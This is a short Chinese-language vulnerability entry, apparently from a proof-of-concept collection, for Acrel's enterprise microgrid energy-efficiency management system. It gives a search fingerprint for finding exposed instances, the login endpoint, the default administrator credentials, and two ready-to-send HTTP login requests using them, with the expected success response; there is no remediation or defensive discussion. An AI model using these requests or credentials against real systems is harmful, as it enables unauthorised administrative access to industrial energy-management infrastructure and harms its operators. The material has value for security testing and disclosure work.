# 安科瑞企业微电网能效管理login存在默认密码泄露漏洞

- **系统**：安科瑞企业微电网能效管理　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`icon_hash="-1291691164"`
- **请求**：`POST /SubstationWEBV2/user/login HTTP/1.1`

**请求体 / payload**
```
前端js获取账户密码
使用默认账户、密码登录
admin/Acrel001
POCA:
Host:
Response-Msg: chinese
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Api-Version: 2.0.0
projectType: 4
Access-Control-Allow-Origin: *
Content-Length: 119
fLoginname=admin&fPassword=Acrel001&loginType=password&projectType=4
POCB:
POST /SubstationWEBV2/user/login HTTP/1.1
Host:
Response-Msg: chinese
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
projectType: 1
Access-Control-Allow-Origin: *
Content-Length: 119
fLoginname=admin&fPassword=Acrel001&loginType=password&projectType=1
```
- **预期**：200　|　—